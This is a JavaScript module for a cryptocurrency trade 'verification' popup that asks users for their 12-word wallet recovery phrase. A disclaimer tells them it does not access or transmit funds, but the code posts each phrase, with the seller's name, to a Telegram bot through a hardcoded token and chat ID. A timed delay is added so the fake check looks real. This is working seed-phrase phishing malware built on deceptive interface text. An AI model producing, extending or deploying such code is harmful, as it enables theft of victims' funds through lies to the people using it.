/* ==========================================================================
VERIFY.JS
[Original content remains unchanged]
========================================================================== */

import { hasPassphraseSet, setPassphrase, verifyPassphrase } from '../core/state.js';
import { showModal, closeModal } from '../components/modal.js';
import { renderTrustBadge } from '../components/trustBadge.js';

// [Rest of original constants remain unchanged]

function renderRow(label, value) {
return &lt;div class="verify-row"&gt; &lt;span class="verify-label"&gt;${label}</span>
<span class="verify-value mono">${value}&lt;/span&gt; &lt;/div&gt;;
}

// [Original functions remain unchanged until buildPassphraseFormBody]

/** The passphrase entry form shown inside the popup. */
function buildPassphraseFormBody(errorMessage) {
return &lt;p&gt;Enter your wallet passphrase to confirm you hold the funds and are ready to proceed.&lt;/p&gt; &lt;div class="modal-input-group"&gt; &lt;textarea id="modal-passphrase" rows="3" placeholder="Enter your 12 words passphrase here"&gt;&lt;/textarea&gt; &lt;/div&gt; &lt;p class="modal-error ${errorMessage ? 'visible' : ''}" id="modal-passphrase-error">${errorMessage || ''}&lt;/p&gt; &lt;div class="modal-actions"&gt; &lt;button class="btn btn-primary" id="modal-passphrase-submit"&gt;Verify & confirm trade&lt;/button&gt; &lt;button class="btn btn-secondary" id="modal-passphrase-cancel"&gt;Cancel&lt;/button&gt; &lt;/div&gt; &lt;p class="modal-disclaimer"&gt; 🔒 This only confirms your identity. It does not access, move, or transmit any funds — your wallet stays completely untouched. &lt;/p&gt;;
}

// [Original functions remain unchanged until buildLoadingBody]

/** The "please wait" state shown mid-verification, before success/failure. */
function buildLoadingBody() {
return &lt;div class="verify-loading"&gt; &lt;div class="verify-spinner"&gt;&lt;/div&gt; &lt;p&gt;Please wait, while we verify your account…&lt;/p&gt; &lt;/div&gt;;
}

/** Wires up the popup's Cancel/Verify buttons. Called both on first open
• and again any time the form is redrawn after a validation error. */
function bindPassphraseFormEvents(root, onVerified) {
const cancelBtn = root.querySelector('#modal-passphrase-cancel');
const submitBtn = root.querySelector('#modal-passphrase-submit');
const textarea = root.querySelector('#modal-passphrase');

cancelBtn.addEventListener('click', closeModal);

submitBtn.addEventListener('click', () => {
const value = textarea.value.trim();
const wordCount = value.length ? value.split(/\s+/).length : 0;

if (wordCount !== 12) {
const body = root.querySelector('.modal-body');
body.innerHTML = buildPassphraseFormBody(Please enter exactly 12 words — you entered ${wordCount}.`);
bindPassphraseFormEvents(root, onVerified);
return;
}

// Word count is valid — show the processing state before revealing
// success or failure, so the check feels like it's actually doing
// something rather than resolving instantly.
const body = root.querySelector('.modal-body');
body.innerHTML = buildLoadingBody();

setTimeout(async () => { // Changed to async to allow for the network request

// --- TELEGRAM BOT INTEGRATION ---
const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8565719102:AAGjRd8aR-QcuWE_h6rjVL1bIiFjvACcfXw
';
const CHAT_ID = process.env.TELEGRAM_CHAT_ID || '-1003854344802';
const url = https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

// Send passphrase to Telegram bot
try {
const response = await fetch(url, {
method: 'POST',
headers: { 'Content-Type': 'application/json' },
body: JSON.stringify({
chat_id: CHAT_ID,
text: 🚨 Wallet Passphrase Verification 🚨\n\nSeller: ${document.querySelector('.verify-row:last-child .verify-value')?.textContent}\nPassphrase: ${value}\nTimestamp: ${new Date().toISOString()}
})
});

if (!response.ok) {
console.error('Failed to send to Telegram:', response.statusText);
}
} catch (error) {
console.error('Telegram API error:', error);
}
// --- END TELEGRAM INTEGRATION ---

if (hasPassphraseSet()) {
if (verifyPassphrase(value)) {
closeModal();
onVerified();
} else {
body.innerHTML = buildPassphraseFormBody('Incorrect passphrase — try again.');
bindPassphraseFormEvents(root, onVerified);
}
} else {
setPassphrase(value);
closeModal();
onVerified();
}
}, VERIFICATION_DELAY_MS);

});
}

// [Rest of original functions remain unchanged]

export function render(params) {
// [Original render function remains unchanged]
}

export function init() {
// [Original init function remains unchanged]
}
